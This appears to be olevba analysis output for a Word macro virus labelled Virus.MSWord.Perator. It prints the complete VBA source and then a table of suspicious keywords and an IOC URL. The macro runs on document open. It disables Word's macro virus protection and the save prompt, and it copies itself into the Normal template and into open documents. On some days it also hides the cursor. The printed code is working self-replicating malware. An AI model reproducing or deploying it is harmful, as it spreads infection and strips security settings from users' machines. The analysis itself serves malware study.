olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Perator
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Perator - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





























                                                                            
                                                                            Private Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer
                                                                            Private Sub Document_Open()
                                                                            On Error Resume Next: Set egger = MacroContainer: tappler = 2
                                                                            With Dialogs(wdDialogFileSummaryInfo): .Title = "bHAK 31337 oPERATOR/rUNE wAS hERE": .Author = "oPERATOR": .Keywords = "http://lz0vx.cjb.net": .Execute: End With
                                                                            SetAttr NormalTemplate.FullName, vbNormal: Options.SaveNormalPrompt = (Rnd * 0)
                                                                            Set walchensteiner = egger.VBProject: Options.VirusProtection = (Rnd * 0)
                                                                            Set laggner = walchensteiner.vbcomponents((tappler - 1)): Set gaggl = laggner.codemodule
                                                                            Set straubinger = NormalTemplate: bachler = gaggl.lines((tappler - 1), gaggl.countoflines)
                                                                            If egger = straubinger Then Set straubinger = ActiveDocument
                                                                            Set thalhammer = straubinger.VBProject.vbcomponents((tappler - 1)).codemodule
                                                                            If Right(thalhammer.lines((tappler * 26), (tappler - 1)), 27) <> "'bHAK 31337 - oPERATOR/rUNE" Then
                                                                            thalhammer.deletelines 1, thalhammer.countoflines
                                                                            thalhammer.addfromstring bachler
                                                                            If ActiveDocument.Saved = False Then ActiveDocument.SaveAs ActiveDocument.FullName
                                                                            End If
                                                                            If Day(Now()) = (tappler * (Int(Rnd * 15))) Then
                                                                            MsgBox "bLEED°rAKAtAKA", 0, "BHAK 31337"
                                                                            While ShowCursor(False) >= 0
                                                                            Wend
                                                                            End If
                                                                            End Sub
                                                                            'bHAK 31337 - oPERATOR/rUNE

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://lz0vx.cjb.net|URL                                          |
+----------+--------------------+---------------------------------------------+

